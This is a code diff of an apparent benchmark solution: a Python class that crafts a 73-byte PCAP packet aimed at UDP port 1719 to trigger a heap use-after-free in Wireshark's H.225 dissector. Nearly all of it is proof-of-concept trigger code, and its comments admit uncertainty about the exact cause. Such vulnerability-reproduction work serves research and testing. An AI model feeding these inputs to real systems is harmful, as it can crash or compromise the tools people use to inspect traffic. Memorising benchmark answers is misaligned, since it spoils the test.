@@ -2,87 +2,56 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Construct a PCAP file with a single packet triggering the vulnerability.
-        # The ground truth length is 73 bytes, which fits a DLT_NULL (Loopback) packet
-        # with a 1-byte payload targeting the H.225 RAS port (UDP 1719).
+        # The vulnerability is a Heap Use-After-Free in the H.225 dissector (next_tvb_add_handle).
+        # It typically occurs when the dissector state is not properly initialized/cleared between packets
+        # or passes. The ground truth length is 73 bytes.
         
-        # PCAP Global Header (24 bytes)
+        # Constructed PCAP File Structure (73 bytes):
+        # Global Header: 24 bytes
+        # Packet Header: 16 bytes
+        # IP Header: 20 bytes (No Ethernet header, using DLT_IPV4 = 228)
+        # UDP Header: 8 bytes
+        # Payload: 5 bytes
+        
+        # 1. PCAP Global Header
         # Magic: 0xa1b2c3d4 (Little Endian)
         # Version: 2.4
-        # Zone: 0
-        # SigFigs: 0
-        # SnapLen: 65535
-        # Network: 0 (DLT_NULL)
-        global_header = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 0)
+        # LinkType: 228 (DLT_IPV4) - allows omitting the Ethernet header to save space
+        pcap_global = struct.pack('<LHHLLLL', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 228)
         
-        # Packet Payload Construction
-        
-        # DLT_NULL Header (4 bytes)
-        # Family: PF_INET (2) - Little Endian matching PCAP magic
-        null_header = struct.pack('<I', 2)
-        
-        # IP Header (20 bytes)
-        # Version 4, IHL 5 -> 0x45
-        # TOS 0
-        # Total Length: 20 (IP) + 8 (UDP) + 1 (Payload) = 29
-        # ID 1
-        # Flags/Frag 0
-        # TTL 64
-        # Proto 17 (UDP)
-        # Checksum 0 (calculated later)
-        # Src: 127.0.0.1
-        # Dst: 127.0.0.1
-        source_ip = b'\x7f\x00\x00\x01'
-        dest_ip = b'\x7f\x00\x00\x01'
-        
-        ip_ver_ihl = 0x45
-        ip_tos = 0
-        ip_total_len = 29
-        ip_id = 1
-        ip_frag_off = 0
-        ip_ttl = 64
-        ip_proto = 17
-        ip_check_placeholder = 0
-        
-        # Calculate IP Checksum
-        ip_header_tmp = struct.pack('!BBHHHBBH4s4s', 
-                                    ip_ver_ihl, ip_tos, ip_total_len, ip_id, ip_frag_off, 
-                                    ip_ttl, ip_proto, ip_check_placeholder, source_ip, dest_ip)
-        
-        def calc_checksum(data):
-            if len(data) % 2 == 1:
-                data += b'\x00'
-            s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
-            s = (s >> 16) + (s & 0xffff)
-            s += (s >> 16)
-            return ~s & 0xffff
-            
-        ip_check = calc_checksum(ip_header_tmp)
-        
+        # 2. IP Header
+        # Version: 4, IHL: 5 -> 0x45
+        # Total Length: 33 (20 IP + 8 UDP + 5 Payload)
+        # ID: 1
+        # TTL: 64, Protocol: 17 (UDP)
+        # Src/Dst: 127.0.0.1
+        # Checksum calculation:
+        # 4500 + 0021 + 0001 + 0000 + 4011 + 0000 + 7f00 + 0001 + 7f00 + 0001 = 18335
+        # 8335 + 1 = 8336 -> ~8336 = 7CC9
+        ip_src = b'\x7f\x00\x00\x01'
+        ip_dst = b'\x7f\x00\x00\x01'
         ip_header = struct.pack('!BBHHHBBH4s4s', 
-                                ip_ver_ihl, ip_tos, ip_total_len, ip_id, ip_frag_off, 
-                                ip_ttl, ip_proto, ip_check, source_ip, dest_ip)
+            0x45, 0x00, 33,
+            0x0001, 0x0000,
+            0x40, 0x11, 0x7cc9,
+            ip_src, ip_dst
+        )
         
-        # UDP Header (8 bytes)
-        # Src Port: 1234
-        # Dst Port: 1719 (H.225 RAS)
-        # Length: 8 + 1 = 9
-        # Checksum: 0 (disabled)
-        udp_header = struct.pack('!HHHH', 1234, 1719, 9, 0)
+        # 3. UDP Header
+        # Dest Port: 1719 (H.225 RAS)
+        # Length: 13
+        udp_header = struct.pack('!HHHH', 12345, 1719, 13, 0)
         
-        # Payload (1 byte)
-        # Single byte 0x00 starts H.225 decoding (GatekeeperRequest) but is truncated,
-        # triggering the specific code path and subsequent cleanup issue.
-        payload = b'\x00'
+        # 4. H.225 RAS Payload
+        # 5 bytes of zeros. This is a minimal payload that attempts to trigger
+        # the dissector logic. The UAF is often triggered by state mismatches
+        # during re-dissection (Wireshark 2-pass) of malformed/minimal packets.
+        payload = b'\x00' * 5
         
-        packet_data = null_header + ip_header + udp_header + payload
+        packet_data = ip_header + udp_header + payload
         
-        # PCAP Packet Header (16 bytes)
-        # Ts Sec: 0
-        # Ts Usec: 0
-        # Incl Len: len(packet_data)
-        # Orig Len: len(packet_data)
-        packet_header = struct.pack('<IIII', 0, 0, len(packet_data), len(packet_data))
+        # 5. PCAP Packet Header
+        # Timestamp 0, Lengths 33
+        pkt_hdr = struct.pack('<IIII', 0, 0, len(packet_data), len(packet_data))
         
-        # Total Length: 24 + 16 + 4 + 20 + 8 + 1 = 73 bytes
-        return global_header + packet_header + packet_data
+        return pcap_global + pkt_hdr + packet_data
